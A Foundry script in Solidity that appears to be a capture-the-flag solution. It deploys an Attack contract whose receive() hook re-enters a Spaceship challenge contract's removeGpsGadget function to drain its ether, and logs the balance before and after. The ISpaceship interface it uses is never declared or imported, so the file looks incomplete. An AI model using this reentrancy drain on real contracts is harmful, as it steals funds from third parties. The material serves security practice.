// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import { VmSafe } from "forge-std/Vm.sol";
import { Script } from "forge-std/Script.sol";
import { Setup } from "./Setup.sol";
import { Spaceship } from "./Spaceship.sol";

contract Attack {
    ISpaceship public spaceship;

    constructor(address _spaceship) {
        spaceship = ISpaceship(_spaceship);
    }

    function pwn() external {
        spaceship.removeGpsGadget();
    }

    receive() external payable {
        if (address(spaceship).balance >= 0.5 ether) {
            spaceship.removeGpsGadget();
        }
    }
}

contract Exploit is Script {
    VmSafe.Wallet public solver;
    Spaceship public chall;
    Setup public _setup;

    function setUp() public {
        _setup = Setup(payable(vm.envAddress("CHALLENGE_CONTRACT")));
        chall = _setup.spaceship();
        solver = vm.createWallet(uint256(vm.envBytes32("PRIVATE_KEY")));
    }

    function run() public {
        vm.startBroadcast(solver.privateKey);

        console.log("spaceship balance: ", address(chall).balance);

        Attack attack = new Attack(address(chall));
        attack.pwn();

        console.log("spaceship balance: ", address(chall).balance);

        vm.stopBroadcast();
    }
}
